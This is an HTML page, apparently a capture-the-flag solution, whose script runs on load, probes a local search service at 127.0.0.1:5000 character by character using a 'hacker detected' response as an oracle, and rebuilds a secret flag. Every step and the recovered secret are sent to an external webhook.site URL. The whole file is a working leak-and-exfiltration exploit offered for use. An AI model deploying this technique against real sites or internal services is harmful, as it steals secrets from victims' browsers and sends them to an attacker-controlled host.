<!DOCTYPE html>
<html>
<head>
    <title>Working Exploit</title>
</head>
<body>
    <script>
        // Replace with your webhook URL
        const WEBHOOK = 'https://webhook.site/11e453b1-e116-4947-9501-3016aceedae5';
        
        const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}-!';
        let flag = 'BOH25{';
        
        function send(data) {
            fetch(WEBHOOK + '?data=' + encodeURIComponent(JSON.stringify(data)), {mode: 'no-cors'}).catch(() => {});
        }
        
        async function check(query) {
            try {
                const res = await fetch('http://127.0.0.1:5000/search?q=' + encodeURIComponent(query));
                const text = await res.text();
                return text.includes('hacker detected');
            } catch (e) {
                send({error: e.message, query: query});
                return false;
            }
        }
        
        async function extract() {
            send({start: true, flag: flag});
            
            while (flag.length < 100 && !flag.endsWith('}')) {
                let found = false;
                
                for (let c of charset) {
                    const test = flag + c;
                    const detected = await check(test);
                    
                    send({test: test, detected: detected});
                    
                    if (detected) {
                        // Verify this is the next char by checking a longer string
                        // If test + unlikely_string is NOT detected, then test is likely a prefix
                        const verify = test + 'XXX_UNLIKELY_STRING_123';
                        const verifyDetected = await check(verify);
                        
                        if (!verifyDetected) {
                            flag += c;
                            found = true;
                            send({found: c, flag: flag});
                            break;
                        }
                    }
                    
                    await new Promise(r => setTimeout(r, 100));
                }
                
                if (!found) {
                    send({stuck: true, flag: flag});
                    break;
                }
            }
            
            send({complete: true, flag: flag});
            document.body.innerHTML = '<h1>Flag: ' + flag + '</h1>';
        }
        
        extract();
    </script>
</body>
</html>

